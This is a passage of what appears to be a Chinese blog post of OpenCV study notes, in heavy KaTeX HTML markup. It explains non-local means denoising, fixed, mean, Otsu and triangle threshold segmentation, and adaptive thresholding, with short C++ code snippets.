class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.7847720000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">[</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mclose">)</span></span></span></span></span></span></p><ul><li><p>h相当于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span>，可以决定非均质滤波模糊的程度。</p></li><li><p>代码实现</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//彩色版本</span></span><br><span class="line"><span class="comment">//src,dst,h,color-h,模板边长,搜索窗口l</span></span><br><span class="line">fastNIMeansDenoisingColored(src,dst,<span class="number">15</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">21</span>);</span><br><span class="line"><span class="comment">//灰度版本</span></span><br><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">fastNIMeansDenoising(gray,dst2);</span><br></pre></td></tr></table></figure><ul><li>这个方法非常慢，但是对于高斯模糊后的图片处理非常好。</li></ul><h1 id="阈值分割"><a class="markdownIt-Anchor" href="#阈值分割"></a> 阈值分割</h1><h2 id="二值图像"><a class="markdownIt-Anchor" href="#二值图像"></a> 二值图像</h2><ul><li>灰度图像和二值图像：都是单通道，但是灰度图像取值范围是0~255，二值图像只有0和255。</li></ul><h2 id="方法概述"><a class="markdownIt-Anchor" href="#方法概述"></a> 方法概述</h2><ul><li>五种阈值分割的方法：设定阈值为：T</li></ul><p>|方法||<br />|||<br />|THRESH_BINARY|大于T：255，否则：0|<br />|THRESH_BINARY_INV|小于T：255，否则：0|<br />|THRESH_TRUNC|小于T：原值，否则：T|<br />|THRESH_TOZERO|小于T：0，否则：原值|<br />|THRESH_TOZERO_INV|大于T：0，否则：原值|</p><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat gray,binary;</span><br><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">imshow(<span class="string">&quot;gray&quot;</span>,gray);</span><br><span class="line">threshold(gray,binary,<span class="number">127</span>,<span class="number">255</span>,THRESH_BINARY);</span><br><span class="line">imshow(<span class="string">&quot;threshold&quot;</span>binary);</span><br></pre></td></tr></table></figure><h2 id="全局阈值分割"><a class="markdownIt-Anchor" href="#全局阈值分割"></a> 全局阈值分割</h2><ul><li>对图像进行二值化操作，最重要的就是计算阈值。前面使用一个自己定义的阈值，并不准确。</li><li>全局阈值分割是一种自动查找阈值的方法</li></ul><h3 id="均值阈值"><a class="markdownIt-Anchor" href="#均值阈值"></a> 均值阈值</h3><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>h</mi></munderover><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mi>w</mi></munderover><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></mrow><mrow><mi>w</mi><mo separator="true">⋅</mo><mi>h</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">m=\frac{\sum_{i=0}^h\sum_{j=0}^w{p(i,j)}}{w·h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.500826em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.814826em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.825818em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>255</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>&gt;</mo><mo>=</mo><mi>m</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>&lt;</mo><mi>m</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">p(i,j)=\begin{cases} 255&amp;&gt;=m \\0&amp;&lt;m\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">&gt;</span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">Scalar m = mean(gray);</span><br><span class="line">threshold(gray,binary,m[<span class="number">0</span>],<span class="number">255</span>,THRESH_BINARY);</span><br></pre></td></tr></table></figure><h3 id="otsu阈值"><a class="markdownIt-Anchor" href="#otsu阈值"></a> Otsu阈值</h3><ul><li>均值并不能真是反应图像的分布信息，使用直方图可以解决这个缺点</li><li>大津法原理就是找到一个分隔，使得类内之间差距比较小，类类之间差距比较大，这样就可以分布不同的类别</li></ul><h4 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h4><ul><li>将原图直方图进行划分为2类，前景和背景，这里选择2作为分隔，</li><li>分别求取前景和背景的比重、平均值、方差</li></ul><p><img src="/images/pasted-71.png" alt="直方图" /></p><ul><li>根据求得的结果，计算类内方差</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">/</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>t</mi><msubsup><mi>a</mi><mi>w</mi><mn>2</mn></msubsup><mo>=</mo><msub><mi>w</mi><mi>b</mi></msub><mo separator="true">⋅</mo><mi mathvariant="normal">/</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>t</mi><msubsup><mi>a</mi><mi>b</mi><mn>2</mn></msubsup><mo>+</mo><msub><mi>w</mi><mi>f</mi></msub><mo separator="true">⋅</mo><mi mathvariant="normal">/</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>t</mi><msubsup><mi>a</mi><mi>f</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">/theta^2_w=w_b·/theta_b^2+w_f·/theta_f^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">/</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2472159999999999em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">/</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li><p>再选择其他作为分隔，找到最小方差的域作为分隔点</p></li><li><p>代码实现</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> t = threshold(gray,binary,<span class="number">0</span>,<span class="number">255</span>,THRESH_BINARY|THRESH_OTSU);</span><br></pre></td></tr></table></figure><ul><li>大津法对单峰多峰都比较好</li></ul><h3 id="三角法"><a class="markdownIt-Anchor" href="#三角法"></a> 三角法</h3><ul><li>假设直方图效果是一个单脉冲的结构，那么做极值点到终点的辅助线就形成了一个三角，找到最长的d对应的h，保证<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">/</mi><mi>a</mi><mi>l</mi><mi>p</mi><mi>h</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">/alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">/</mi><mi>b</mi><mi>e</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">/beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span></span></span></span>是45°，此时的点就是阈值的分隔点T</li><li>通常接近峰值的T效果并不高，通常是乘以1.2的系数，作为最终的T</li></ul><p><img src="/images/pasted-72.png" alt="三角法" /></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mn>2</mn></msup><mo>=</mo><msup><mi>d</mi><mn>2</mn></msup><mo>+</mo><msup><mi>d</mi><mn>2</mn></msup><mo>−</mo><mo>−</mo><mo>&gt;</mo><mi>d</mi><mo>=</mo><msqrt><mfrac><msup><mi>h</mi><mn>2</mn></msup><mn>2</mn></mfrac></msqrt><mo>−</mo><mo>−</mo><mo>&gt;</mo><mi>d</mi><mo>=</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mn>0.7854</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">h^2=d^2+d^2--&gt;d=\sqrt{\frac{h^2}{2}}--&gt;d=sin(0.7854)*h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.44em;vertical-align:-0.7405709999999996em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6994290000000003em;"><span class="svg-align" style="top:-4.4em;"><span class="pstrut" style="height:4.4em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.417108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.6594290000000007em;"><span class="pstrut" style="height:4.4em;"></span><span class="hide-tail" style="min-width:1.02em;height:2.48em;"><svg width='400em' height='2.48em' viewBox='0 0 400000 2592' preserveAspectRatio='xMinYMin slice'><path d='M424,2478c-1.3,-0.7,-38.5,-172,-111.5,-514c-73,-342,-109.8,-513.3,-110.5,-514c0,-2,-10.7,14.3,-32,49c-4.7,7.3,-9.8,15.7,-15.5,25c-5.7,9.3,-9.8,16,-12.5,20s-5,7,-5,7c-4,-3.3,-8.3,-7.7,-13,-13s-13,-13,-13,-13s76,-122,76,-122s77,-121,77,-121s209,968,209,968c0,-2,84.7,-361.7,254,-1079c169.3,-717.3,254.7,-1077.7,256,-1081c4,-6.7,10,-10,18,-10H400000v40H1014.6s-87.3,378.7,-272.6,1166c-185.3,787.3,-279.3,1182.3,-282,1185c-2,6,-10,9,-24,9c-8,0,-12,-0.7,-12,-2z M1001 80H400000v40H1014z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7405709999999996em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord">0</span><span class="mord">.</span><span class="mord">7</span><span class="mord">8</span><span class="mord">5</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span></span></p><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> t = threshold(gray,binary,<span class="number">0</span>,<span class="number">255</span>,THRESH_BINARY|THRESH_TRIANGLE);</span><br></pre></td></tr></table></figure><ul><li>缺点：仅对单峰效果比较好。常用于医疗图像的阈值分隔，这类图片的峰值单一。</li></ul><h2 id="自适应阈值"><a class="markdownIt-Anchor" href="#自适应阈值"></a> 自适应阈值</h2><ul><li><p>由于光照不均匀的原因，使用全局阈值会丢失一部分信息</p></li><li><p>原理：对模糊图像求差值再二值化</p></li><li><p>步骤</p><ol><li>对原图进行盒子模糊，得到图像D</li><li>原图+偏置常量C，获得图像S</li><li>最终图像T=S-D+255</li></ol></li><li><p>即：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>=</mo><mi>o</mi><mi>r</mi><mi>i</mi><mi>g</mi><mi>i</mi><msub><mi>n</mi><mi>i</mi></msub><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>+</mo><mi>C</mi><mo>−</mo><mi>D</mi><mo>:</mo><mn>255</mn><mi>i</mi><mi>f</mi><mo>&gt;</mo><mn>0</mn><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">T = origin_image+C-D : 255 if &gt;0 else 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord 